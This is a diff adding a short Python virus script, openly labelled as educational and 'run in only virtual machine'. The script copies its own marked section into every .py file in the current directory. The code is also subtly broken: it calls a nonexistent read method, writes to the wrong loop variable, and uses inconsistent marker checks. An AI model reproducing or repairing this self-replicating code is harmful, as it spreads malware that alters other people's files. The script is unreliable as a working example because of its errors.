@@ -1,2 +1,50 @@
-#This script is a virus
+#This script is a virus!!
+#Run in only virtual machine!!
+#Educational Purposes!!
+#Targets file systems
+
+# START OF VIRUS #
+
+import sys, glob
+
+# writing the content in the current working file 
+list=[]
+#opens current file in read mode
+with open(sys.argv[0], 'r') as x: 
+  file_content= x.readfile_content()
+area= False  #write to a specfic area, set to false originally since target area is unknown, check for conditions
+for file in file_content:
+  if file =="# START OF VIRUS # \n":
+    area=True
+  elif area:
+    list.append(file)
+  elif file == "# END OF VIRUS #":
+    break
+
+# Targeting the other user Files
+
+#it will focus on any file witht the .py extension only can be modified to whatever target
+target_files=glob.glob('*.py')
+print ("Files:", target_files)
+for files in target_files:
+  with open(files,'r') as x:
+    script = x.readlines()
+  infected = False # check if the file has been infected 
+  for line in script:
+    if line == "# START OF VIRUS # \n":  #if the infected file starts with the phrase then we know its infected
+      infected= True
+      break
+    elif not infected: #if not infected then create a list that extends the original list and script and write to  target file
+      final_list=[]
+      final_list.extend(list)
+      #final_list.extend('\n')
+      final_list.extend(script)
+      with open(file, 'w') as x: #open the file in write mode to to infect the file
+        x.writelines(final_list)
+
+#Payload
+print(" Files are infected !!")
+
+# END OF VIRUS #
+
 
